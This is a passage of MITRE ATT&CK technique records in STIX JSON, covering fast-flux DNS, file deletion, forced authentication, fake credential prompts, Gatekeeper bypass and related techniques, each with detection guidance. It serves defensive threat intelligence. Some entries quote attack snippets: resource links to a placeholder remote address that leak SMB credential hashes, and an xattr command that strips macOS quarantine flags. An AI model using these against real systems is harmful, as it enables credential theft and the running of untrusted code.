    "{\"created\":\"2020-03-11T14:11:16.560Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\\n\\nThe simplest, \\\"single-flux\\\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\\n\\nIn contrast, the \\\"double-flux\\\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.\",\"external_references\":[{\"external_id\":\"T1568.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1568/001\"},{\"description\":\"Mehta, L. (2014, December 17). Fast Flux Networks Working and Detection, Part 1. Retrieved March 6, 2017.\",\"source_name\":\"MehtaFastFluxPt1\",\"url\":\"https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref\"},{\"description\":\"Mehta, L. (2014, December 23). Fast Flux Networks Working and Detection, Part 2. Retrieved March 6, 2017.\",\"source_name\":\"MehtaFastFluxPt2\",\"url\":\"https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref\"},{\"description\":\"Albors, Josep. (2017, January 12). Fast Flux networks: What are they and how do they work?. Retrieved March 11, 2020.\",\"source_name\":\"Fast Flux - Welivesecurity\",\"url\":\"https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/\"}],\"id\":\"attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T16:10:37.183Z\",\"name\":\"Fast Flux DNS\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DNS records\"],\"x_mitre_detection\":\"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:17.915Z\",\"external_references\":[{\"external_id\":\"T1107\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1107\"},{\"description\":\"Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.\",\"source_name\":\"Trend Micro APT Attack Tools\",\"url\":\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\"}],\"id\":\"attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59\",\"modified\":\"2020-01-31T12:36:39.086Z\",\"name\":\"File Deletion\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-31T12:35:36.479Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary\'s footprint.\\n\\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)\",\"external_references\":[{\"external_id\":\"T1070.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/004\"},{\"description\":\"Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.\",\"source_name\":\"Trend Micro APT Attack Tools\",\"url\":\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\"}],\"id\":\"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:34:16.209Z\",\"name\":\"File Deletion\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Walker Johnson\"],\"x_mitre_data_sources\":[\"Binary file metadata\",\"Process command-line parameters\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\"],\"x_mitre_detection\":\"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:43.063Z\",\"external_references\":[{\"external_id\":\"T1044\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1044\"},{\"external_id\":\"CAPEC-17\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/17.html\"},{\"description\":\"Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.\",\"source_name\":\"Mozilla Firefox Installer DLL Hijack\",\"url\":\"https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/\"},{\"description\":\"Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe\\tallows remote code execution with escalation of privilege. Retrieved March 10, 2017.\",\"source_name\":\"Seclists Kanthak 7zip Installer\",\"url\":\"http://seclists.org/fulldisclosure/2015/Dec/34\"}],\"id\":\"attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a\",\"modified\":\"2020-03-19T15:11:39.627Z\",\"name\":\"File System Permissions Weakness\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-15T16:16:25.763Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as FTP, FTPS, and TFPT that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \",\"external_references\":[{\"external_id\":\"T1071.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1071/002\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T20:26:46.465Z\",\"name\":\"File Transfer Protocols\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:04.710Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).\",\"external_references\":[{\"external_id\":\"T1083\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1083\"},{\"description\":\"Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.\",\"source_name\":\"Windows Commands JPCERT\",\"url\":\"http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html\"}],\"id\":\"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T17:18:36.857Z\",\"name\":\"File and Directory Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2018-10-17T00:14:20.652Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\\n\\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [.bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\",\"external_references\":[{\"external_id\":\"T1222\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1222\"},{\"description\":\"Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls1 June 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\"},{\"description\":\"Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls2 May 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\"},{\"description\":\"Netsurion. (2014, February 19). Monitoring File Permission Changes with the Windows Security Log. Retrieved August 19, 2018.\",\"source_name\":\"EventTracker File Permissions Feb 2014\",\"url\":\"https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/\"}],\"id\":\"attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T23:12:40.212Z\",\"name\":\"File and Directory Permissions Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"CrowdStrike Falcon OverWatch\",\"Jan Miller, CrowdStrike\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"File system access controls\"],\"x_mitre_detection\":\"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\\n\\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2019-04-12T18:28:15.451Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.\",\"external_references\":[{\"external_id\":\"T1495\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1495\"},{\"description\":\"Yamamura, M. (2002, April 25). W95.CIH. Retrieved April 12, 2019.\",\"source_name\":\"Symantec Chernobyl W95.CIH\",\"url\":\"https://www.symantec.com/security-center/writeup/2000-122010-2655-99\"},{\"description\":\"Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.\",\"source_name\":\"MITRE Trustworthy Firmware Measurement\",\"url\":\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\"}],\"id\":\"attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2019-07-17T21:23:45.464Z\",\"name\":\"Firmware Corruption\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"BIOS\",\"Component firmware\"],\"x_mitre_detection\":\"System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_permissions_required\":[\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\\n\\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\\n\\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\\n\\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user\'s system accesses the untrusted resource it will attempt authentication and send information, including the user\'s hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\\n\\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\\n\\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\\\\\[remote address]\\\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)\",\"external_references\":[{\"external_id\":\"T1187\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1187\"},{\"description\":\"Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.\",\"source_name\":\"Wikipedia Server Message Block\",\"url\":\"https://en.wikipedia.org/wiki/Server_Message_Block\"},{\"description\":\"Stevens, D. (2017, November 13). WebDAV Traffic To Malicious Sites. Retrieved December 21, 2017.\",\"source_name\":\"Didier Stevens WebDAV Traffic\",\"url\":\"https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/\"},{\"description\":\"Microsoft. (n.d.). Managing WebDAV Security (IIS 6.0). Retrieved December 21, 2017.\",\"source_name\":\"Microsoft Managing WebDAV Security\",\"url\":\"https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx\"},{\"description\":\"Dunning, J. (2016, August 1). Hashjacking. Retrieved December 21, 2017.\",\"source_name\":\"GitHub Hashjacking\",\"url\":\"https://github.com/hob0/hashjacking\"},{\"description\":\"Cylance. (2015, April 13). Redirect to SMB. Retrieved December 21, 2017.\",\"source_name\":\"Cylance Redirect to SMB\",\"url\":\"https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf\"},{\"description\":\"Osanda Malith Jayathissa. (2017, March 24). Places of Interest in Stealing NetNTLM Hashes. Retrieved January 26, 2018.\",\"source_name\":\"Osanda Stealing NetNTLM Hashes\",\"url\":\"https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\"},{\"description\":\"US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved November 2, 2017.\",\"source_name\":\"US-CERT APT Energy Oct 2017\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA17-293A\"}],\"id\":\"attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-06-19T17:16:41.470Z\",\"name\":\"Forced Authentication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Teodor Cimpoesu\",\"Sudhanshu Chauhan, @Sudhanshu_C\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Network protocol analysis\",\"Network device logs\",\"Process use of network\"],\"x_mitre_detection\":\"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\\n\\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-02-11T18:58:45.908Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)).\\n\\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015). \",\"external_references\":[{\"external_id\":\"T1056.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1056/002\"},{\"external_id\":\"CAPEC-659\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/659.html\"},{\"description\":\"Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.\",\"source_name\":\"OSX Malware Exploits MacKeeper\",\"url\":\"https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html\"},{\"description\":\"Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.\",\"source_name\":\"LogRhythm Do You Trust Oct 2014\",\"url\":\"https://logrhythm.com/blog/do-you-trust-your-computer/\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"},{\"description\":\"Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.\",\"source_name\":\"Enigma Phishing for Credentials Jan 2015\",\"url\":\"https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/\"}],\"id\":\"attack-pattern--a2029942-0a85-4947-b23c-ca434698171d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:56:14.853Z\",\"name\":\"GUI Input Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Molyett, @s1air, Cisco Talos\"],\"x_mitre_data_sources\":[\"PowerShell logs\",\"User interface\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials.\\n\\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1144\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1144\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Rich Trouton. (2012, November 20). Clearing the quarantine extended attribute from downloaded applications. Retrieved July 5, 2017.\",\"source_name\":\"Clearing quarantine attribute\",\"url\":\"https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/\"},{\"description\":\"Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.\",\"source_name\":\"OceanLotus for OS X\",\"url\":\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\"},{\"description\":\"Thomas Reed. (2016, March 31). Bypassing Apple\'s Gatekeeper. Retrieved July 5, 2017.\",\"source_name\":\"Bypassing Gatekeeper\",\"url\":\"https://blog.malwarebytes.com/cybercrime/2015/10/bypassing-apples-gatekeeper/\"}],\"id\":\"attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e\",\"modified\":\"2020-02-05T16:23:01.683Z\",\"name\":\"Gatekeeper Bypass\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-05T16:16:08.471Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple\'s Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \\n\\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)\\n \\nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)\",\"external_references\":[{\"external_id\":\"T1553.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1553/001\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Rich Trouton. (2012, November 20). Clearing the quarantine extended attribute from downloaded applications. Retrieved July 5, 2017.\",\"source_name\":\"Clearing quarantine attribute\",\"url\":\"https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/\"},{\"description\":\"Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.\",\"source_name\":\"OceanLotus for OS X\",\"url\":\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\"},{\"description\":\"Thomas Reed. (2016, March 31). Bypassing Apple\'s Gatekeeper. Retrieved July 5, 2017.\",\"source_name\":\"Bypassing Gatekeeper\",\"url\":\"https://blog.malwarebytes.com/cybercrime/2015/10/bypassing-apples-gatekeeper/\"}],\"id\":\"attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:41:20.063Z\",\"name\":\"Gatekeeper 